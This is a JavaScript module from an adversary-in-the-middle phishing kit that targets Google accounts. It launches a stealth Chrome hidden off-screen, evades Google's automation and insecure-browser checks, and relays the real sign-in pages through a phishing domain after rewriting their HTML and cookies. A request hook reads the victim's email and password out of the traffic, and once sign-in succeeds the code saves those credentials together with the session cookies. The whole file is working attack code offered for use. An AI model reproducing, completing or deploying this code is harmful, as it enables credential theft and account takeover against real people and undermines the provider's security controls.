/**
 * Google assist browser — puppeteer-extra + stealth (evilpuppet-google style).
 * Playwright Extra still gets /signin/rejected after Next; Puppeteer stealth is the known stack.
 */

import fs from 'node:fs';
import path from 'node:path';
import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import { saveCapture } from './capture.js';
import {
  rewriteHtmlForPhish,
  mapCookiesForPhish,
  playwrightUrlToPhishLocation,
  getHostMapForPhishlet,
  phishBaseFromHost,
} from './domain-rewrite.js';

const stealth = StealthPlugin();
try {
  stealth.enabledEvasions.delete('iframe.contentWindow');
  stealth.enabledEvasions.delete('media.codecs');
} catch { /* */ }
puppeteer.use(stealth);

function findChrome() {
  const candidates = [
    process.env.PUPPETEER_EXECUTABLE_PATH,
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
    path.join(process.env.LOCALAPPDATA || '', 'Google\\Chrome\\Application\\chrome.exe'),
  ].filter(Boolean);
  for (const p of candidates) {
    try {
      if (fs.existsSync(p)) return p;
    } catch { /* */ }
  }
  return undefined;
}

function isGoogleSecureBlock(text) {
  return /may not be secure|Couldn't sign you in|This browser or app may not be secure|suspicious traffic/i
    .test(text || '');
}

function launchArgs(config) {
  const w = config?.viewport?.width || 1366;
  const h = config?.viewport?.height || 768;
  const args = [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--ignore-certificate-errors',
    '--ignore-certificate-errors-spki-list',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--no-first-run',
    '--no-default-browser-check',
    '--disable-dev-shm-usage',
    '--mute-audio',
    '--disable-features=IsolateOrigins,site-per-process',
    '--enable-features=NetworkService',
    `--window-size=${w},${h}`,
  ];
  // Background: real Chrome off-screen (headless is fingerprinted; user must not see a window)
  if (config?.background !== false && !config?.headless) {
    args.push('--window-position=-32000,-32000');
  }
  return args;
}

export async function createBrowserSession(config, { clientIp = 'unknown', onCaptured }) {
  // Prefer real Chrome off-screen. Only use headless when config.headless=true.
  const headless = config.headless === true || config.headless === 'new'
    ? (config.headless === 'new' ? 'new' : true)
    : false;
  console.log(
    `[puppet-bridge] assist via puppeteer-extra/stealth `
    + `(${headless ? 'headless' : 'off-screen background Chrome'})`,
  );

  const chromePath = findChrome();
  if (!chromePath) {
    throw new Error('Chrome not found — install Google Chrome or set PUPPETEER_EXECUTABLE_PATH');
  }
  console.log(`[puppet-bridge] Chrome → ${chromePath}`);

  const browser = await puppeteer.launch({
    headless,
    executablePath: chromePath,
    channel: undefined,
    ignoreDefaultArgs: ['--enable-automation'],
    args: launchArgs(config),
    defaultViewport: {
      width: config.viewport?.width || 1366,
      height: config.viewport?.height || 768,
    },
  });

  const page = await browser.newPage();
  await page.setExtraHTTPHeaders({
    'Accept-Language': config.acceptLanguage || 'en-US,en;q=0.9',
  });
  await page.evaluateOnNewDocument(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
  });

  const wd = await page.evaluate(() => navigator.webdriver).catch(() => 'err');
  console.log(`[puppet-bridge] stealth ok navigator.webdriver=${String(wd)}`);

  let email = '';
  let password = '';
  let captured = false;
  const successRe = new RegExp(config.successUrlPattern, 'i');

  page.on('request', (request) => {
    const body = request.postData() || '';
    if (!body.includes('f.req')) return;
    const passMatch = body.match(/\\"([^"\\]{3,128})\\"/);
    if (passMatch && body.includes('B4hajb')) {
      password = decodeURIComponent(passMatch[1]);
    }
    const mailMatch = body.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
    if (mailMatch) email = mailMatch[0];
  });

  page.on('response', async (response) => {
    try {
      const url = response.url();
      if (response.status() >= 300 && response.status() < 400) return;
      if (!successRe.test(url) || captured) return;
      if (!email && !password) return;
      captured = true;
      const cookies = await page.cookies();
      const capPath = saveCapture(config.captureDir, clientIp.replace(/[^a-z0-9.-]/gi, '_'), {
        email,
        password,
        url,
        clientIp,
        cookies,
        phishletName: config.phishletName,
      });
      onCaptured?.({ email, password, cookies, path: capPath });
    } catch { /* */ }
  });

  async function pageBodyText() {
    return page.evaluate(() => document.body?.innerText || '').catch(() => '');
  }

  async function isPasswordStep() {
    return page.evaluate(() => {
      const el = document.querySelector('input[type="password"], input[name="Passwd"]');
      if (!el) return false;
      const rect = el.getBoundingClientRect();
      const style = window.getComputedStyle(el);
      const visible = rect.width > 0 && rect.height > 0
        && style.visibility !== 'hidden'
        && style.display !== 'none'
        && style.opacity !== '0';
      if (!visible) return false;
      // Identifier SPA can keep a hidden Passwd; require challenge URL or visible heading
      const pathOk = /\/challenge|\/pwd|password/i.test(location.pathname + location.search);
      const heading = (document.querySelector('h1, h2, [role="heading"]')?.textContent || '').toLowerCase();
      const headingOk = /password|парол/i.test(heading);
      return pathOk || headingOk || (!document.querySelector('#identifierId, input[name="identifier"]'));
    }).catch(() => false);
  }

  async function isIdentifierStep() {
    return page.$('input#identifierId, input[type="email"], input[name="identifier"]')
      .then((el) => !!el)
      .catch(() => false);
  }

  async function waitMs(ms) {
    await new Promise((r) => setTimeout(r, ms));
  }

  async function gotoTarget() {
    console.log(`[puppet-bridge] Navigate → ${config.targetUrl}`);
    await page.goto(config.targetUrl, { waitUntil: 'domcontentloaded', timeout: 120_000 });
    await waitMs(800);
    let bodyText = await pageBodyText();
    if (isGoogleSecureBlock(bodyText)) {
      console.warn('[puppet-bridge] secure-block on load — reload once');
      await waitMs(1500);
      await page.reload({ waitUntil: 'domcontentloaded', timeout: 60_000 }).catch(() => {});
      await waitMs(800);
      bodyText = await pageBodyText();
    }
    if (isGoogleSecureBlock(bodyText)) {
      throw new Error('Google blocked this Chrome session on load');
    }
  }

  async function ensureIdentifierPage() {
    if (await isIdentifierStep()) return;
    if (await isPasswordStep()) return;
    await gotoTarget();
  }

  async function submitEmail(value) {
    if (!value) return;
    email = value;
    if (await isPasswordStep()) {
      console.log('[puppet-bridge] Password step already active — skip email fill');
      return;
    }

    async function attemptOnce() {
      if (!(await isIdentifierStep())) await gotoTarget();
      if (isGoogleSecureBlock(await pageBodyText())) await gotoTarget();

      const sel = 'input#identifierId, input[type="email"], input[name="identifier"]';
      await page.waitForSelector(sel, { visible: true, timeout: 30_000 });
      await page.click(sel, { clickCount: 3 }).catch(() => {});
      await page.focus(sel);
      // Clear then human-type
      await page.keyboard.down('Control');
      await page.keyboard.press('KeyA');
      await page.keyboard.up('Control');
      await page.keyboard.press('Backspace');
      console.log('[puppet-bridge] Filling email…');
      for (const ch of value) {
        await page.keyboard.type(ch, { delay: 50 + Math.floor(Math.random() * 80) });
      }
      await waitMs(400 + Math.floor(Math.random() * 500));
      console.log('[puppet-bridge] Clicking Next…');
      const clicked = await page.evaluate(() => {
        const btn = document.querySelector('#identifierNext button, #identifierNext')
          || [...document.querySelectorAll('button')].find((b) => /^(Next|Далее)$/i.test((b.textContent || '').trim()));
        if (!btn) return false;
        btn.click();
        return true;
      });
      if (!clicked) {
        await page.click('#identifierNext', { timeout: 10_000 }).catch(() => {});
      }
      await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 60_000 }).catch(() => {});
      await waitMs(600);
    }

    await attemptOnce();
    let pwdOk = false;
    const deadline = Date.now() + 40_000;
    while (Date.now() < deadline) {
      if (await isPasswordStep()) { pwdOk = true; break; }
      if (isGoogleSecureBlock(await pageBodyText())) break;
      await waitMs(400);
    }

    if (!pwdOk && isGoogleSecureBlock(await pageBodyText())) {
      console.warn('[puppet-bridge] secure-block after Next — fresh navigation + retry');
      await gotoTarget();
      await attemptOnce();
      const d2 = Date.now() + 35_000;
      while (Date.now() < d2) {
        if (await isPasswordStep()) { pwdOk = true; break; }
        if (isGoogleSecureBlock(await pageBodyText())) break;
        await waitMs(400);
      }
    }

    if (!pwdOk) {
      if (isGoogleSecureBlock(await pageBodyText())) {
        throw new Error('Google blocked transition to password step');
      }
      throw new Error('Password field not visible after email submit');
    }
    console.log('[puppet-bridge] Password step ready');
    await waitMs(400);
  }

  async function getPageForProxy(phishDomain, { path, query, phishHost, stage = 0 } = {}) {
    const host = phishHost || `accounts.${phishDomain || config.phishDomain}`;
    const reqPath = (path || '/') + (query ? `?${query}` : '');

    if (stage === 2) {
      const deadline = Date.now() + 60_000;
      while (Date.now() < deadline) {
        if (await isPasswordStep()) break;
        if (isGoogleSecureBlock(await pageBodyText()) || /\/signin\/rejected/i.test(page.url())) {
          throw new Error('Playwright/Puppeteer hit secure-block — do not MITM');
        }
        if (email && !(await isPasswordStep())) {
          try { await submitEmail(email); } catch { /* keep waiting */ }
        }
        await waitMs(500);
      }
      if (!(await isPasswordStep())) throw new Error('password step timeout');
      return buildProxyResponse(host, reqPath, { forcePath: reqPath, omitCookies: false });
    }

    if (stage === 1) {
      await ensureIdentifierPage();
      if (isGoogleSecureBlock(await pageBodyText()) && !(await isIdentifierStep())) {
        throw new Error('Google secure-block on identifier');
      }
      // Sync Playwright cookies so remaining APIs aren't an empty MITM session;
      // noisy RPCs (browserinfo) are stubbed in the phish shim to avoid 400/lag.
      return buildProxyResponse(host, reqPath, { omitCookies: false, forcePath: reqPath });
    }

    return buildProxyResponse(host, reqPath, { omitCookies: true });
  }

  async function buildProxyResponse(phishHost, reqPath, { forcePath, omitCookies = false } = {}) {
    let html = await page.content();
    if (isGoogleSecureBlock(html) || /\/signin\/rejected/i.test(page.url())) {
      throw new Error('refusing to inject Google secure-block / rejected page');
    }
    const hostMap = getHostMapForPhishlet(config);
    const site = config.phishDomain || phishBaseFromHost(phishHost);
    html = rewriteHtmlForPhish(html, phishHost, hostMap, {
      phishSiteDomain: site,
      phishletName: config.phishletName || 'google',
      sessionKey: String(clientIp || ''),
    });

    const rawCookies = omitCookies ? [] : await page.cookies();
    const cookies = omitCookies ? [] : mapCookiesForPhish(rawCookies, phishHost, site);
    const u = new URL(page.url());
    const pagePath = u.pathname + u.search;
    let location = '';
    if (!forcePath && reqPath && pagePath !== reqPath) {
      location = playwrightUrlToPhishLocation(page.url(), phishHost) || pagePath;
    }

    console.log(`[puppet-bridge] resp.Body ${html.length}b cookies=${cookies.length} pw=${await isPasswordStep()}`);
    return {
      status: location ? 302 : 200,
      contentType: 'text/html; charset=utf-8',
      body: html,
      location,
      path: forcePath || pagePath,
      cookies,
    };
  }

  async function close() {
    try { await browser.close(); } catch { /* */ }
  }

  return {
    page: {
      // minimal adapter used by session-manager wait loops
      waitForTimeout: waitMs,
      url: () => page.url(),
      evaluate: (...a) => page.evaluate(...a),
    },
    gotoTarget,
    submitEmail,
    getPageForProxy,
    ensureIdentifierPage,
    isPasswordStep,
    isIdentifierStep,
    close,
    _puppeteerPage: page,
  };
}
